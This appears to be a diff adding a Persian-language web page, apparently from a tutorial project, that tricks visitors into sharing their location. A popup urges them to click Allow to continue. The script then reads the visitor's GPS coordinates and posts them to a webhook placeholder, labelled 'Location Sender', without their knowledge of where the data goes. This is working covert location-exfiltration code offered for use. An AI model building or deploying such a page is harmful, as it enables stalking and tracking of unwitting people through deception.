@@ -1,0 +1,59 @@
+<!-- DociTeam - GetLocationJs -->
+<!-- YouTube Video : https://youtu.be/e_hunvhHviQ -->
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>مکان یاب</title>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+        <link rel="stylesheet" href="./style.css">
+      
+      </head>
+<body>
+<header class="hero hero--map gps-bg">
+	
+	<div class="gps-bg__guts">
+		<div class="gps-bg__bg"></div>
+		<div class="gps-bg__route"></div>
+		<div class="gps-bg__marker"></div>
+	</div>
+	<div class="gps-bg__fade"></div>
+
+	<h1 class="hero__title">
+		....در حال جست و جوی یه جای خلوت
+	</h1>
+	
+</header>
+
+<script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        } else { 
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+
+    function showPosition(position) {
+        const request = new XMLHttpRequest();
+            request.open("POST", "Your Webhook Here");
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                        username: "Location Sender",
+                        avatar_url: "",
+                        content:"**__Latitude:__ **"+ position.coords.latitude + "\n\n" + "**__Longitude:__ **" + position.coords.longitude + "\n\n" + "**=========================================================================**"
+                        };
+            request.send(JSON.stringify(params));
+    }
+    getLocation();
+    Swal.fire({
+        title: 'کلیک کنید Allow روی دکمه',
+        text: "کلیک کنید Allow برای ادامه کار روی دکمه",
+        icon: 'warning',
+        });
+
+</script>
+
+</body>
+</html>
